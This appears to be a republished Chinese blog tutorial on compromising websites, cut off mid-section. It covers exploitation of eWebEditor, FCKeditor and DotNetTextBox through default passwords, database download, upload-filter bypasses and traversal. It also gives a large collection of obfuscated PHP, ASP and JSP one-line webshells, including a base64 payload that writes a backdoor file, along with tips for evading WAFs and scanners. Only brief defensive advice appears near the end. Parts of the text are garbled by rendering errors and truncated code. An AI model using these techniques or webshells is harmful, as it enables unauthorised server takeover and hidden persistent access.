<!doctype html>
<html lang="en-us">
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">


    <title>编辑器漏洞菜刀一句话变量覆盖WEB日志检测webshellNC反弹shell | 开发者问答集锦</title>
    <meta property="og:title" content="编辑器漏洞菜刀一句话变量覆盖WEB日志检测webshellNC反弹shell - 开发者问答集锦">
    <meta property="og:type" content="article">
        
    <meta property="article:published_time" content='2020-09-02T00:00:00&#43;08:00'>
        
        
    <meta property="article:modified_time" content='2020-09-02T00:00:00&#43;08:00'>
        
    <meta name="Keywords" content="">
    <meta name="description" content="编辑器漏洞菜刀一句话变量覆盖WEB日志检测webshellNC反弹shell">
        
    <meta name="author" content="">
    <meta property="og:url" content="https://zaina.newban.cn/posts/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E8%8F%9C%E5%88%80%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96web%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8Bwebshellnc%E5%8F%8D%E5%BC%B9shell/">
    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">

    <link rel="stylesheet" href='/css/normalize.css'>
    <link rel="stylesheet" href='/css/style.css'>
    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>

    
    
    
    
    
    
</head>


<body>
    <header id="header" class="clearfix">
    <div class="container">
        <div class="col-group">
            <div class="site-name ">
                
                    <a id="logo" href="https://zaina.newban.cn">
                        开发者问答集锦
                    </a>
                
                
            </div>
            <div>
                <nav id="nav-menu" class="clearfix">
                    <a class="" href="https://zaina.newban.cn">首页</a>
                    
                </nav>
            </div>
        </div>
    </div>
</header>

    <div id="body">
        <div class="container">
            <div class="col-group">

                <div class="col-8" id="main">
                    
<div class="res-cons">
    
    <article class="post">
        <header>
            <h1 class="post-title">编辑器漏洞菜刀一句话变量覆盖WEB日志检测webshellNC反弹shell</h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        
        <div class="post-meta">
            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
                    阅读</span></span>
        </div>
        
        
        <div class="post-content">
            

<ol>
<li>编辑器漏洞整理<br />
1.常见的编辑器</li>
</ol>

<p>常见的有Ewebeditor,fckeditor,ckeditor,kindeditor等等。这里有份编辑器漏洞手册:</p>

<p><a href="http://navisec.it/编辑器漏洞手册/">http://navisec.it/编辑器漏洞手册/</a></p>

<p>2.Ewebeditor编辑器</p>

<p>Ewebeditor是基于浏览器的、所见即所得的在线HTML编辑器。她能够在网页上实现许多桌面编辑软件（如：Word）所具有的强大可视编辑功能。WEB开发人员可以用她把传统的多行文本输入框替换为可视化的富文本输入框，使最终用户可以可视化的发布HTML格式的网页内容。eWebEditor!已基本成为网站内容管理发布的必备工具！</p>

<p>3.Ewebeditor利用核心</p>

<p>如何发现编辑器地址</p>

<p>Ewebeditor：<br />
默认后台：ewebeditor/admin_login.asp<br />
默认数据库：ewebeditor/db/ewebeditor.mdb<br />
默认账号密码：admin admin/admin888</p>

<p>4.利用过程</p>

<p>通常入侵ewebeditor编辑器的步骤如下:</p>

<p>1、首先访问默认管理页看是否存在</p>

<pre><code>   默认管理页地址2.80以前为 ewebeditor/admin_login.asp 以后版本为admin/login.asp(其他语言改后戳,这里以asp为例) 。
</code></pre>

<p>2、默认管理帐号密码</p>

<pre><code>   默认管理页存在！我们就用帐号密码登陆！默认帐号密码为: admin admin888 ！常用的密码还有admin admin999 admin1 admin000 之类的。
</code></pre>

<p>3、默认数据库地址</p>

<pre><code>   如果密码不是默认的。我们访问的就不是默认数据库！尝试下载数据库得到管理员密码！管理员的帐号密码，都在eWebEditor_System表段里，sys_UserName Sys_UserPass 都是md5加密的。得到了加密密码。可以去www.cmd5.com www.xmd5.org 等网站进行查询！暴力这活好久不干了！也可以丢国外一些可以跑密码的网站去跑!
</code></pre>

<p>默认数据库路径为:ewebeditor/db/ewebeditor.mdb 常用数据库路径为:</p>

<p>ewebeditor/db/ewebeditor.asa</p>

<p>ewebeditor/db/ewebeditor.asp</p>

<p>ewebeditor/db/#ewebeditor.asa</p>

<p>ewebeditor/db/#ewebeditor.mdb</p>

<p>ewebeditor/db/!@#ewebeditor.asp</p>

<p>ewebeditor/db/ewebeditor1033.mdb 等等。</p>

<pre><code>   很多管理员常改.asp后缀，一般访问.asp .asa 后缀的都是乱码！可以用下载工具下载下来，然后更改后缀为.mdb来查看内容！
</code></pre>

<p>4、漏洞基本利用步骤，以asp为例！</p>

<pre><code> 1）  登陆后台以后。选择样式管理，默认编辑器的默认样式都不可以修改的。我们可以从任意样式新建一个样式，然后在图片上传添加可上传后缀。.asa .cer .cdx 等！.asp 过滤过了。但是我们可以用.aaspsp后缀来添加，这样上传文件正好被ewebeditor 吃掉asp后缀，剩下.asp 。同样，如果遇到一个管理员有安全意识的，从代码里，把.asp .asa .cer .cdx 都完全禁止了，我们也可以用.asasaa 后缀来突破。添加完了后缀，可以在样式管理，点击预览，然后上传！
</code></pre>

<p>asa|cer|asp|aaspsp</p>

<p>Asa cer 它可以在iis6.0平台解析为asp执行</p>

<p>Aaspsp：绕过过滤 过滤asp aaspsp=》asp</p>

<p>注意：低版本ewebeditor不支持ie7.0以下版本访问（ietest软件模拟ie6.0上传）</p>

<p>以下以2.1.6这个版本为例来演示:</p>

<p>点击样式管理,然后新增样式</p>

<p>在图片类型中加入以下类型:asa|cer|asp|aaspsp</p>

<p>然后点击提交。</p>

<p>然后在工具栏里新增工具</p>

<p>在按钮设置里新增&rdquo;插入或修改图片&rdquo;</p>

<p>然后点击保存设置。然后再回去点击预览。</p>

<p>控件效果就出来了。然后直接上传一句话木马</p>

<p>点击确定，上传成功，之后，查看代码，就能看到完整的地址</p>

<p>用菜刀一连就能就OK了。。。</p>

<p>2）目录遍历</p>

<p>点击&rdquo;上传文件管理&rdquo; 然后选择样式目录。</p>

<p>在id=14后面加上&amp;dir=…/</p>

<p>[html] view plain copy<br />
<a href="http://192.168.87.129:8123/admin_uploadfile.asp?id=14&amp;dir=../">http://192.168.87.129:8123/admin_uploadfile.asp?id=14&amp;dir=../</a></p>

<p>发现没有起作用，那就是2.1.6这个版本不存在这个漏洞。换成2.8.0。2.8.0存在这个漏洞</p>

<p>能遍历目录。</p>

<p>3）寻找前人痕迹再次入侵</p>

<p>有时候用户名与密码得等不进去，但是数据库可以下载，这时候就可以看下是否有前人入侵过，如果有人入侵过的话，就可以利用下面的方法进入突破。</p>

<p>如何判断有前人入侵过了??下载好数据库之后查看他的eWebEditor_style表中的S_ImageExt字段是否有被人添加过什么。</p>

<p>使用下面的语句进入突破:</p>

<p>ewebeditor.asp?ID=xx&amp;style=yy</p>

<p>其中的id=xx就是被修改过的那条记录的id，而yy就是S_name字段的名字。</p>

<p>例如这里就修改成: ewebeditor.asp?ID=54&amp;style=testckse 去访问</p>

<p>图片控件就出来了。。</p>

<p>5.FCKeditor编辑器</p>

<p>可以去这下载编辑器:<a href="http://download.csdn.net/detail/u011781521/9767326">http://download.csdn.net/detail/u011781521/9767326</a></p>

<p>1.查看编辑器版本</p>

<p>FCKeditor/_whatsnew.html</p>

<p>2.FCKeditor编辑器页</p>

<p>FCKeditor/_samples/default.html</p>

<p>3.常用上传地址</p>

<pre><code>1. FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp  
2. FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/  
3. FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp  
4. FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../connectors/asp/connector.asp  
</code></pre>

<p>由于这里用的是2.5的版本所以下面这条语句能用</p>

<p><a href="http://192.168.87.129:8234//editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../connectors/asp/connector.asp">http://192.168.87.129:8234//editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../connectors/asp/connector.asp</a></p>

<p>如果在输入以上地址测试的过程中弹出以下的提示</p>

<p>那就是没有开启文件上传功能,要把\editor\filemanager\connectors\asp\config.asp文件中的</p>

<p>Dim ConfigIsEnabled<br />
ConfigIsEnabled = False</p>

<p>设置成功true。就行了，然后上传6.asp;.jpg文件试试</p>

<p>发现他进行了过滤6.asp;.jpg改成了6_asp;.jpg,把点改成了下划线。审查元素看下图片的路径</p>

<p>访问这个路径看下。</p>

<p>asp文件并没有被解析成功。</p>

<p>这就是fckeditor过滤&rdquo;.“为”_&ldquo;的一个机制,想要突破的话有以下两种方式：</p>

<p>1.二次上传</p>

<p>第一次上传：qq.asp;.jpg ==》qq_asp;.jpg</p>

<p>第二次上传：qq.asp;.jpg ==》qq_asp;.jpg (不满足命名要求)</p>

<p>可能出现第二次命名为 qq.asp;.(1).jpg</p>

<p>还是被过滤了。。</p>

<p>2.新建上传</p>

<p>手动新建一个文件夹</p>

<p>发现他还是过滤了。那我们只有突破建立文件夹了。</p>

<p>执行以下地址就能成功创建文件夹</p>

<p>/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/fendo.asp&amp;NewFolderName=x.asp</p>

<p>这又是为什么了???手动不能创建，而通过以上地址就能成功创建了，让我们来对比下，手动创建和通过以上地址创建的一个区别。</p>

<p>漏洞地址：</p>

<p>/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/fendo.asp&amp;NewFolderName=x.asp</p>

<p>手工新建：</p>

<p>/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/&amp;NewFolderName=fendo.asp</p>

<p>原因：</p>

<p>CurrentFolder：当前文件夹 未进行过滤(这个文件夹下的没有过滤)</p>

<p>NewFolderName：新建文件名 进行了过滤</p>

<p>这就是为什么通过上面地址能创建，而手动却不能创建的一个原因，然后我们再上传6.asp;.jpg到fendo.asp文件下看是否成功解析。</p>

<p>成功解析。。</p>

<p>3.DotNetTextBox编辑器漏洞利用</p>

<p>DotNetTextBox编辑器洞洞文件上传漏洞</p>

<p>详细说明：</p>

<p>DotNetTextBox编辑器洞洞 上传任意文件</p>

<p>漏洞证明：</p>

<p>1、用firebug将disabled=&ldquo;disabled’，value=&ldquo;jgp,gif,png&rdquo;修改为enabled=“enabled”,value=“jpg,gif,png,aspx”，然后点更新成功按钮</p>

<p>DotNetTextBox编辑器洞洞 上传任意文件<br />
2、弹出更新成功</p>

<p>DotNetTextBox编辑器洞洞 上传任意文件<br />
3、刷新页面，发现此时可允许上传的图片类型，成功新增aspx类型</p>

<p>DotNetTextBox编辑器洞洞 上传任意文件<br />
4、找个aspx webshell上传、提示文件上传成功</p>

<p>DotNetTextBox编辑器洞洞 上传任意文件<br />
5、上传成功、成功躺在那里</p>

<p>DotNetTextBox编辑器洞洞 上传任意文件<br />
6、webshell页面</p>

<p>DotNetTextBox编辑器洞洞 上传任意文件</p>

<p>但是有 system_dntb/uploadimg.aspx
并能打开，这时候是不能上传的，由于他是验证cookie来得出上传后的路径，这样我们可以用cookie欺骗工具。或者用burpsuite抓包修改cookie，修改为：</p>

<p>cookie:UserType=0; IsEdition=0; Info=1; uploadFolder=…/system_dntb/Upload/<br />
路径可以修改，只是权限够，上传后改名为1.asp;.jpg利用iis解析漏洞。<br />
8. php回调后门<br />
中国菜刀下载,基于原版中国菜刀优化版20160309.</p>

<p>下载地址:</p>

<p><a href="http://pan.baidu.com/s/1jHoJxHW">http://pan.baidu.com/s/1jHoJxHW</a></p>

<p>China chopper</p>

<p><a href="http://pan.baidu.com/s/1eRxEYjC">http://pan.baidu.com/s/1eRxEYjC</a></p>

<p>下面是收集并整理的各种一句话,带使用方法：</p>

<p>1.php</p>

<p>用法: <a href="http://www.xxx.com/1.php">http://www.xxx.com/1.php</a></p>

<p>菜刀连接用法: <a href="http://www.xxx.com/1.php">http://www.xxx.com/1.php</a></p>

<p>密码：joker</p>

<p>详解： assert，是php代码执行函数，与eval()有同样的功能，应为 a r r a y [ ] , P O S T [ ] 都 是 数 组 ， 所
以 a r r a y [ ] = P O S T ， 就 是 把 P O S T 数 组 的 值 赋 给 a r r a y 数 组 ， 这 样 的 话
array[],POST[]都是数组，所以array[]=POST，就是把POST数组的值赋给array数组，这样的话
array[],POST[]都是数组，所以array[]=POST，就是把POST数组的值赋给array数组，这样的话array[0][‘POST’]的输出就是assert，所以组成了一句话木马</p>

<p>assert($_POST[‘joker’])，直接用菜刀链接即可</p>

<p>————————————————————————————————————————————————————————</p>

<p>2.php</p>

<p>复制代码</p>

<p>复制代码<br />
用法: <a href="http://www.xxx.com/2.php">http://www.xxx.com/2.php</a></p>

<p>菜刀连接用法: <a href="http://www.xxx.com/2.php">http://www.xxx.com/2.php</a></p>

<p>密码：joker</p>

<p>详解：$g是个数组，g[1]=′s′，chr(′116′)=′t′,(<a href="https://blog.csdn.net/yabingshitech/article/details/19833217ASCll码对应表)，这样的gg=">https://blog.csdn.net/yabingshitech/article/details/19833217ASCll码对应表)，这样的gg=</a></p>

<p>assert，@gg(_POST[joker])不就是assert($_POST[joker])，是我们常见的一句话木马，直接菜刀链接即可</p>

<p>————————————————————————————————————————————————————————</p>

<p>3.php (array_filter+base64_decode)</p>

<p>复制代码</p>

<p>复制代码<br />
用法: <a href="http://www.xxx.com/3.php?e=YXNzZXJ0">http://www.xxx.com/3.php?e=YXNzZXJ0</a></p>

<p>浏览器提交POST：joker=phpinfo();</p>

<p>菜刀连接用法: <a href="http://www.xxx.com/3.php?e=YXNzZXJ0">http://www.xxx.com/3.php?e=YXNzZXJ0</a></p>

<p>密码：joker</p>

<p>详解：base64_decode()函数主要用于base64的解码，YXNzZXJ0的base64解码后的结果为assert，e接受浏览器传过来的参数，arr是个数组，array_filter()函数用回调函数过滤数组中的值，</p>

<p>，如果我们传入$e的参数为YXNzZXJ0，这样的话我们的回调函数名就是assert，并且要过滤数组中的每一个参数</p>

<p>就构成了assert($_POST[‘joker’])，常见的一句话木马，直接用菜刀链接即可</p>

<p>——————————————————————————————————————————————————————————</p>

<p>4.php</p>

<p>用法: <a href="http://www.xxx.com/4.php">http://www.xxx.com/4.php</a></p>

<p>菜刀连接用法: <a href="http://www.xxx.com/4.php">http://www.xxx.com/4.php</a></p>

<p>密码：joker</p>

<p>详解：call_user_func()函数把第一个参数作为回调函数调用，也就是说assert是被调用的回调函数，其余参数是回调函数的参数。</p>

<p>这样的话就直接构成了 assert($_REQUEST[‘joker’]) 这样的一句话木马，直接用菜刀链接即可</p>

<p>———————————————————————————————————————————————————————————</p>

<p>5.php (array_map+base64_decode)</p>

<p>复制代码</p>

<p>复制代码<br />
用法: <a href="http://www.xxx.com/5.php?e=YXNzZXJ0">http://www.xxx.com/5.php?e=YXNzZXJ0</a></p>

<p>浏览器提交POST：joker=phpinfo();</p>

<p>菜刀连接用法: <a href="http://www.xxx.com/5.php?e=YXNzZXJ0">http://www.xxx.com/5.php?e=YXNzZXJ0</a></p>

<p>密码：joker</p>

<p>详解：我们主要来看array_map()这个函数，array_map()
函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。</p>

<p>这样的话我们传递过去的assert()，就会对arr数组中的每一个值进行作用，assert(_POST[‘joker’]) ,直接菜刀链接即可</p>

<p>————————————————————————————————————————————————————————————————————</p>

<p>6.php (uasort+base64_decode)</p>

<p>复制代码</p>

<p>复制代码</p>

<p>1, $_REQUEST[&lsquo;joker&rsquo;] =&gt; 2); uksort($arr, $e); ?&gt;</p>

<p>用法: <a href="http://www.xxx.com/6.php?e=YXNzZXJ0">http://www.xxx.com/6.php?e=YXNzZXJ0</a></p>

<p>浏览器提交POST：joker=phpinfo();</p>

<p>菜刀连接用法: <a href="http://www.xxx.com/6.php?e=YXNzZXJ0">http://www.xxx.com/6.php?e=YXNzZXJ0</a></p>

<p>密码：joker</p>

<p>详解：我们主要来看uasort,uksort这两个函数，uasort() 函数使用用户自定义的比较函数按照值对数组排序，并保持索引关联（不为元素分配新的键）</p>

<p>。uksort()函数用法与uasort()函数相似，不过是通过用户自定义的比较函数对数组按键名进行排序。第一个例子是按照比较值来排序，传递进来的自</p>

<p>定义函数assert()，会作用与(REQUEST[′joker′])这个值，就构成了一句话木马；第二个例子是按照比较键名来排序，传递进来的自定义函数assert()，会作用与(_REQUEST[‘joker’])
这个键名，构成了一句话木马，直接操刀链接即可。</p>

<p>————————————————————————————————————————————————————————————</p>

<p>7.php</p>

<p>复制代码</p>

<p>复制代码<br />
用法: <a href="http://www.xxx.com/7.php?e=assert">http://www.xxx.com/7.php?e=assert</a></p>

<p>浏览器提交POST：joker=phpinfo();</p>

<p>菜刀连接用法: <a href="http://www.xxx.com/7.php?e=assert">http://www.xxx.com/7.php?e=assert</a></p>

<p>密码：joker</p>

<p>详解：我们先来看array_udiff()这个函数，array_udiff() 函数用于比较两个（或更多个）数组的键值
，并返回差集，注释：该函数使用用户自定义函数来比较键值！</p>

<p>也就是说e是可调用的比较函数，数组arr与arr1的差集为(_POST[‘joker’])，1，这时候传过来assert()比较函数将会作用，assert($_POST[‘joker’])，构成一句话</p>

<p>木马，直接用菜刀链接</p>

<p>————————————————————————————————————————————————————————————————————</p>

<p>8.php (array_walk+preg_replace)</p>

<p>复制代码</p>

<p>&rsquo;|.*|e&rsquo;,); array_walk($arr, $e, &ldquo;); ?&gt;</p>

<p>复制代码<br />
用法: <a href="http://www.xxx.com/8.php?e=preg_replace">http://www.xxx.com/8.php?e=preg_replace</a></p>

<p>浏览器提交POST：joker=phpinfo();</p>

<p>菜刀连接用法: <a href="http://www.xxx.com/8.php?e=preg_replace">http://www.xxx.com/8.php?e=preg_replace</a></p>

<p>密码：joker</p>

<p>详解：这个后门可以在php5.3下使用，array_walk()函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数。至于我们为什幺要</p>

<p>传一个preg_replace进去，preg_replace函数原型：mixed preg_replace ( mixed pattern, mixed
replacement, mixed subject [, int limit])</p>

<p>特别说明： /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保
replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。</p>

<p>意思是pattern也就是匹配模式出现/e修正符，后面的replacement就会被当作php代码执行，这样的话我们直接把
($_POST[‘joker’]) 这个小马运行，所以直接用菜刀链接即可</p>

<p>与之有相似功能的函数还有 ： mb_ereg_replace() ，preg_filter()</p>

<p>——————————————————————————————————————————————————————————————————————</p>

<p>9.php</p>

<p>浏览器GET提交：<a href="http://www.xxx.com/9.php?e=assert&amp;settoken=phpinfo();即可执行phpinfo(">http://www.xxx.com/9.php?e=assert&amp;settoken=phpinfo();即可执行phpinfo(</a>);</p>

<p>菜刀连接用法: <a href="http://www.xxx.com/9.php?e=assert">http://www.xxx.com/9.php?e=assert</a></p>

<p>密码：joker</p>

<p>详解：register_shutdown_function()函数是来注册一个会在PHP中止时执行的函数，</p>

<p>PHP中止的情况有三种：<br />
执行完成<br />
exit/die导致的中止<br />
发生致命错误中止<br />
，这样的话等到php函数执行完成，就会调用我们传进去的php中止时执行的函数</p>

<p>构成 assert($_REQUEST[‘joker’]) ，一句话木马 ，直接用菜刀链接即可</p>

<p>——————————————————————————————————————————————————————————————————————</p>

<p>10.php</p>

<p>复制代码</p>

<p>复制代码<br />
浏览器GET提交：<a href="http://www.xxx.com/10.php?e=assert&amp;settoken=phpinfo();即可执行phpinfo(">http://www.xxx.com/10.php?e=assert&amp;settoken=phpinfo();即可执行phpinfo(</a>);</p>

<p>菜刀连接用法: <a href="http://www.xxx.com/10.php?e=assert">http://www.xxx.com/10.php?e=assert</a></p>

<p>密码：joker</p>

<p>详解：register_tick_function函数必须要和declare流程控制机制合并使用，那么就先了解一下declare和tick：Tick
是一个在 declare 代码段中解释器每执行 N 条低级语句就会发生的事件。N 的值是在 declare 中的 directive 部分用 ticks=N
来指定的。在每个 tick 中出现的事件是由 register_tick_function()
来指定的。也就是说当ticks=1，每执行1行代码，就需要运行一次我们传过来的assert()函数，$_REQUEST[‘joker’]是参数</p>

<p>这样就构成了assert($_REQUEST[‘joker’]) ，直接用菜刀链接一句话木马即可<br />
9. 那些强悍的PHP一句话后门<br />
强悍的PHP一句话后门<br />
这类后门让网站、服务器管理员很是头疼，经常要换着方法进行各种检测，而很多新出现的编写技术，用普通的检测方法是没法发现并处理的。今天我们细数一些有意思的PHP一句话木马。</p>

<p>利用404页面隐藏PHP小马：<br />
复制代码</p>

<p>404 Not Found</p>

<h1 id="not-found">Not Found</h1>

<p>The requested URL was not found on this server.</p>

<p>复制代码 404页面是网站常用的文件，一般建议好后很少有人会去对它进行检查修改，这时我们可以利用这一点进行隐藏后门。</p>

<p>无特征隐藏PHP一句话：</p>

<p>将POST[′code′]的内容赋值给_SESSION[‘theCode’]，然后执行$_SESSION[‘theCode’]，亮点是没有特征码。用扫描工具来检查代码的话，是不会报警的，达到目的了。</p>

<p>超级隐蔽的PHP后门：</p>

<p>仅用GET函数就构成了木马；</p>

<p>利用方法：</p>

<p>?a=assert&amp;b=${fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29};<br />
执行后当前目录生成c.php一句话木马，当传参a为eval时会报错木马生成失败，为assert时同样报错，但会生成木马，真可谓不可小视，简简单单的一句话，被延伸到这般应用。</p>

<p>层级请求，编码运行PHP后门：<br />
此方法用两个文件实现，文件1</p>

<p>复制代码</p>

<p>复制代码<br />
文件2</p>

<p>复制代码</p>

<p>复制代码<br />
通过HTTP请求中的HTTP_REFERER来运行经过base64编码的代码，来达到后门的效果，一般waf对referer这些检测要松一点，或者没有检测。用这个思路bypass
waf不错。</p>

<p>PHP后门生成工具weevely<br />
weevely是一款针对PHP的webshell的自由软件，可用于模拟一个类似于telnet的连接shell，weevely通常用于web程序的漏洞利用，隐藏后门或者使用类似telnet的方式来代替web
页面式的管理，weevely生成的服务器端php代码是经过了base64编码的，所以可以骗过主流的杀毒软件和IDS，上传服务器端代码后通常可以通过weevely直接运行。</p>

<p>weevely所生成的PHP后门所使用的方法是现在比较主流的base64加密结合字符串变形技术，后门中所使用的函数均是常用的字符串处理函数，被作为检查规则的eval，system等函数都不会直接出现在代码中，从而可以致使后门文件绕过后门查找工具的检查。使用暗组的Web后门查杀工具进行扫描，结果显示该文件无任何威胁。</p>

<p>以上是大概介绍下边是截图，相关使用方法亦家就不在这介绍了，简单的科普一下。</p>

<p>那些强悍的PHP一句话后门</p>

<p>三个变形的一句话PHP木马<br />
第一个</p>

<p>在菜刀里写<a href="http://site/1.php?2=assert密码是1">http://site/1.php?2=assert密码是1</a></p>

<p>第二个</p>

<p>复制代码</p>

<p>&rdquo;).($<em>[+&ldquo;&rdquo;]|&ldquo;&rdquo;).($</em>[+&ldquo;&rdquo;]^&ldquo;&rdquo;); ?&gt;</p>

<p>复制代码<br />
复制代码</p>

<p>1、“^”为异或运算符。在PHP中，两个变量进行异或时，会将字符串转换成二进制再进行异或，异或完，又将结果从二进制转换成了字符串。</p>

<p>2、$ <em>++;这行代码的意思是对变量名为&rdquo;</em>
&ldquo;的变量进行自增操作，在PHP中未定义的变量默认值为null,nullfalse0,可以在不使用任何数字的情况下,</p>

<p>通过对未定义变量的自增操作来得到一个数字。</p>

<p>3、$__=(&rdquo;<code>&quot;^&quot;?&quot;).(&quot;:&quot;^&quot;}&quot;).(&quot;%&quot;^&quot;</code>&rdquo;).(&ldquo;{&rdquo;^&ldquo;/&rdquo;);</p>

<p>(&rdquo;`&ldquo;^&rdquo;?&ldquo;) 01100000^00111111=01011111 —&gt;”_”</p>

<p>(&rdquo;:&ldquo;^&rdquo;}&ldquo;) 00111010^01111101=01000111—&gt;”G”</p>

<p>(&ldquo;%&rdquo;^&rdquo;`&ldquo;) 00100101^01100000=01000101—&gt;”E”</p>

<p>(&ldquo;{&rdquo;^&ldquo;/&rdquo;) 01111011^ 00101111=01010100—&gt;”T”</p>

<p>得到$__=_GET</p>

<p>4、KaTeX parse error: Expected group after &lsquo;_&rsquo; at position 1:
_̲__=(&ldquo;&rdquo;&ldquo;{&rdquo;).(&rdquo;~&ldquo;&rdquo;.&ldquo;).(&rdquo;/&ldquo;&rdquo;`&ldquo;).(&rdquo;-&ldquo;&rdquo;~&ldquo;).(&rdquo;(&ldquo;^&rdquo;|&ldquo;);</p>

<p>(&ldquo;$&rdquo;^&ldquo;{&rdquo;) 00100100^01111011=01011111—&gt;”_”</p>

<p>(&rdquo;~&ldquo;^&rdquo;.&ldquo;) 01111110^00101110=01010000—&gt;”P”</p>

<p>(&ldquo;/&rdquo;^&rdquo;`&ldquo;) 00101111^01100000=01001111—&gt;”O”</p>

<p>(&ldquo;-&rdquo;^&rdquo;~&ldquo;) 00101101^01111110=01010011—&gt;”S”</p>

<p>(&ldquo;(&rdquo;^&ldquo;|&rdquo;) 00101000^01111100=01010100—&gt;”T”</p>

<p>得到$___=_POST</p>

<p>5、KaTeX parse error: Expected &lsquo;}&rsquo;, got &lsquo;EOF&rsquo; at end of input: {<strong>}[! ] ( <em>](
]​({KaTeX parse error: Expected group after &lsquo;</em>&rsquo; at position 1: _̲</strong>}[_]);</p>

<p>得到 G E T [ 0 ] ( _GET[0]( G​ET<a href="_POST[1]">0</a>;</p>

<p>6、构造一句话木马，将“0”当成参数，赋值为“assert”</p>

<p>7、使用菜刀工具连接，地址</p>

<p><a href="http://ip/b.php?0=assert">http://ip/b.php?0=assert</a> 密码为1<br />
复制代码</p>

<p>在菜刀里写<a href="http://site/2.php?_=assert&amp;__=eval($_POST[‘pass’]">http://site/2.php?_=assert&amp;__=eval($_POST[‘pass’]</a>)
密码是pass。如果你用菜刀的附加数据的话更隐蔽，或者用其它注射工具也可以，因为是post提交的。</p>

<p>第三个</p>

<p>($b4dboy = KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;&amp;&rsquo; at position 18:
…OST[&lsquo;b4dboy&rsquo;]) &amp;̲&amp; @preg_replace…b4dboy)’, ‘add’);<br />
str_rot13(‘riny’)即编码后的eval，完全避开了关键字，又不失效果，让人吐血！</p>

<p>最后列几个高级的PHP一句话木马后门：<br />
复制代码<br />
1、<br />
$hh = “p”.“r”.“e”.“g”.&rdquo;_&ldquo;.“r”.“e”.“p”.“l”.“a”.“c”.“e”;<br />
h h ( &ldquo; / [ d i s c u z ] / e &ldquo; , hh(&rdquo;/[discuz]/e&rdquo;,
hh(&ldquo;/[discuz]/e&rdquo;,_POST[‘h’],“Access”);<br />
//菜刀一句话</p>

<p>2、<br />
f i l e n a m e = filename= filename=_GET[‘xbid’];<br />
include ($filename);<br />
//危险的include函数，直接编译任何文件为php格式运行</p>

<p>3、<br />
$reg=“c”.“o”.“p”.“y”;<br />
r e g ( reg( reg(_FILES[MyFile][tmp_name],$_FILES[MyFile][name]);<br />
//重命名任何文件</p>

<p>4、<br />
$gzid = “p”.“r”.“e”.“g”.&rdquo;_&ldquo;.“r”.“e”.“p”.“l”.“a”.“c”.“e”;<br />
g z i d ( &ldquo; / [ d i s c u z ] / e &ldquo; , gzid(&rdquo;/[discuz]/e&rdquo;,
gzid(&ldquo;/[discuz]/e&rdquo;,_POST[‘h’],“Access”);<br />
//菜刀一句话</p>

<p>5、include ($uid);<br />
//危险的include函数，直接编译任何文件为php格式运行，POST
www.xxx.com/index.php?uid=/home/www/bbs/image.gif<br />
//gif插一句话</p>

<p>6、典型一句话<br />
程序后门代码</p>

<p>程序代码</p>

<p>//容错代码<br />
程序代码</p>

<p>//使用lanker一句话客户端的专家模式执行相关的php语句<br />
程序代码</p>

<p>$_POST<a href="$_POST['sb']">&lsquo;sa&rsquo;</a>;?&gt;</p>

<p>程序代码</p>

<p>$_POST<a href="$_POST['sb'],$_POST['sc']">&lsquo;sa&rsquo;</a>?&gt;</p>

<p>程序代码</p>

<p>//使用这个后,使用菜刀一句话客户端在配置连接的时候在&rdquo;配置&rdquo;一栏输入<br />
程序代码<br />
h=@eval_r($_POST1);<br />
程序代码</p>

<p>//绕过 复制代码<br />
复制代码<br />
常见的asp一句话后门收集<br />
asp一句话木马：</p>

<p>%&gt;</p>

<p>%&gt;</p>

<p>“:execute request(“value”):a=”</p>

<p>在数据库里插入的一句话木马<br />
┼攠數畣整爠煥敵瑳∨∣┩愾<br />
┼癥污爠煥敵瑳∨≡┩&gt; 密码为: a</p>

<p>php一句话</p>

<p>aspx一句话</p>

<p>JSP一句话后门<br />
if(request.getParameter(“f”)!=null)(new
java.io.FileOutputStream(application.getRealPath(&ldquo;&rdquo;)+request.getParameter(“f”))).write(request.getParameter(“t”).getBytes());<br />
%&gt;<br />
复制代码</p>

<p>如何应对PHP一句话后门：<br />
我们强调几个关键点，看这文章的你相信不是门外汉，我也就不啰嗦了：</p>

<p>1，对PHP程序编写要有安全意识</p>

<p>2，服务器日志文件要经常看，经常备份</p>

<p>3，对每个站点进行严格的权限分配</p>

<p>4，对动态文件及目录经常批量安全审查</p>

<p>5，学会如何进行手工杀毒《即行为判断查杀》</p>

<p>6，时刻关注，或渗入活跃的网络安全营地</p>

<p>7，对服务器环境层级化处理，哪怕一个函数也可做规则<br />
10. windows下原来可以这样隐藏webshell<br />
1、利用保留字隐藏</p>

<p>windows系统有些保留文件夹名，windows系统不允许用这些名字命名文件夹，如</p>

